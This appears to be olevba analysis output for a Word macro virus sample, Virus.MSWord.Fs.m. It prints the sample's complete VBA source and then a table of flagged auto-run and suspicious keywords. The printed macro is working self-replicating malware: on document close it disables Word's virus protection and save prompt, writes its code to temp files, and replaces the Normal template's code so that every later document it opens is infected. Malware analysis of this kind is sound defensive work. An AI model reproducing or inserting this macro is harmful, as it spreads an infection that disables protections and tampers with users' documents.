olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Fs.m-c39977029db572b8b8819daf8798f391e945fe5c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Fs.m-c39977029db572b8b8819daf8798f391e945fe5c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Copyright (C) 1998 by FlyShadow ~^^~ - Plural
Private Sub Document_Close()
On Error Resume Next: γ = Environ("WINDIR") & ".\TEMP\"
Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
η = FreeFile: Open γ & "&" For Output As #η
Print #η, VBProject.VBComponents(1).CodeModule.Lines(1, 20)
Close #η: Open γ & "&&" For Output As #η
Print #η, "Private Sub Document_Open()"
Print #η, "On Error Resume Next: γ = Environ(" & Chr(34) & "WINDIR" & Chr(34) & ")" & "&" & Chr(34) & ".\TEMP\" & Chr(34)
Print #η, "Set ι = ActiveDocument.VBProject.VBComponents(1).Codemodule"
Print #η, "ι.Deletelines 1, ι.CountOfLines"
Print #η, "ι.AddFromFile (γ & " & Chr(34) & "&" & Chr(34) & ")"
Print #η, "End Sub": Close #η
Set ι = NormalTemplate.VBProject.VBComponents(1).CodeModule
ι.Deletelines 1, ι.CountOfLines: ι.AddFromFile (γ & "&&")
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

